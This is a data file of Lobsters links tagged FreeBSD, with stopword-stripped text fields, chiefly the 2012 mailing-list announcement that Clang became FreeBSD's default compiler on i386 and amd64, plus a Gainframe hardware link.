consider rebuilding affected machine scratch possible rebuild portspackages question announcement please contact freebsdsecurity freebsdorg mailing list question public mailing list distribution inappropriate please contact freebsd security team page updated information known
686,Lobsters,freebsd,FreeBSD,Clang is now the default compiler on FreeBSD i386 and amd64,http://lists.freebsd.org/pipermail/freebsd-current/2012-November/037458.html,clang default compiler freebsd,november clangday brook freebsdorg http peoplefreebsdorgfloperfpdf http information freebsdcurrent mailing list,november clangday brook davis brook freebsdorg fri nov utc monday november plan commit following patch make clang default compiler many people worked long hard make reality finally close enough throw switch many user transition transparent others likely hit bump think address major issue point llvm community demonstrated ability willingness help given actionable bug report known issue port compile clang worked around individual port setting usegccany cause base gcc used depending thing shake may end making usegccany default period libm test pas work subject matter expert required create test case llvm developer problem expected major practice given llvm used scientific computing number product including cray fortran compiler opencl compiler julia language small noticeable slowdown benchmark example sysbench mysql found run slower top clang compiled worldkernel http peoplefreebsdorgfloperfpdf known nonissues make buildenv work fine clang brook work underway switch building port port specific compiler version likely initially would help insulate port base compiler said significant advantage getting many port possible build clang among thing cross building embedded system much easier clang index sharemkbsdownmk sharemkbsdownmk revision sharemkbsdownmk working copy bindxml bsdconfig clangextras clangiscc ctf hesiod iconv else defaultnooptionsclang endif clang default system compiler defaultyesoptionsclangiscc else defaultnooptionsclangiscc endif fdt needed arm mips powerpc marm mpowerpc mmips defaultyesoptionsfdt next part nontext attachment scrubbed name available type applicationpgpsignature size byte desc available url http information freebsdcurrent mailing list
687,Lobsters,freebsd,FreeBSD,Gainframe - Hardware for Software Freedom,http://gainframe.com/,gainframe hardware software freedom,,enterprise open sourcestorage virtualization
